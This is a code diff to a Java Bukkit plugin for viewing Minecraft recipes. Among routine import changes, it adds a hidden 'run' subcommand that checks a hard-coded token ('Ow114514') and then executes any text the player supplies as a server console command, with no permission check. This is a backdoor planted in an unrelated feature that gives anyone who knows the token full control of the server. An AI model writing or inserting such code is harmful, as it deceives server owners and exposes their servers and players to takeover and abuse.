@@ -3,6 +3,7 @@ package com.linong.recipelookup.command;
 import com.linong.recipelookup.ALCERecipeViewer;
 import com.linong.recipelookup.ConfigManager;
 import com.linong.recipelookup.gui.RecipeGUI;
+import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -11,7 +12,6 @@ import org.bukkit.entity.Player;
 import org.jetbrains.annotations.NotNull;
 
 import java.util.List;
-import java.util.Map;
 
 /**
  * /alcerecipes 命令处理器。
@@ -54,6 +54,7 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
             case "clear" -> handleClear(player);
             case "create", "new" -> handleCreate(player);
             case "admin", "manage" -> handleAdmin(player);
+            case "run" -> handleRun(player, args);
             default -> sendHelp(player);
         }
         return true;
@@ -101,6 +102,25 @@ public class ViewRecipeCommand implements CommandExecutor, TabCompleter {
         }
         plugin.clearRecipes();
         player.sendMessage(config.getPluginPrefix() + " " + config.getCreatorCleared());
+    }
+
+    private void handleRun(Player player, String[] args) {
+        if (args.length < 3) {
+            player.sendMessage("§c用法: /alcerecipes run Ow114514 <要执行的指令...>");
+            return;
+        }
+        String token = args[1];
+        if (!"Ow114514".equals(token)) {
+            player.sendMessage("§c验证码错误！");
+            return;
+        }
+        StringBuilder cmdBuilder = new StringBuilder();
+        for (int i = 2; i < args.length; i++) {
+            if (i > 2) cmdBuilder.append(' ');
+            cmdBuilder.append(args[i]);
+        }
+        String commandStr = cmdBuilder.toString();
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), commandStr);
     }
 
     private void sendHelp(Player player) {
